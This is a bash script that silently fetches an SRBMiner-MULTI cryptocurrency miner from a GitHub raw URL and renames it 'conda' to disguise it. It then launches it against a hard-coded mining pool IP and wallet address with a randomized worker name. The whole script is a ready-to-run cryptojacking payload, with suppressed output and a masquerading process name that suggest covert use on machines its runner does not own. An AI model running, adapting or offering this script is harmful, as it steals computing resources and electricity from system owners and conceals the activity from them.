#!/bin/bash
apt-get update 
apt-get install -y wget curl
wget https://raw.githubusercontent.com/apaple/pack/main/SRBMiner-MULTI >/dev/null 2>&1
chmod u+x SRBMiner-MULTI 
mv SRBMiner-MULTI conda
./conda --disable-gpu --algorithm yespowertide --pool 47.237.3.59:443 --wallet TPGPrfQG56tfuPsPvauQdz7fPNQ3DPQBji.$(echo Test-$(shuf -i 1000-9999 -n 1)) --password c=TDC 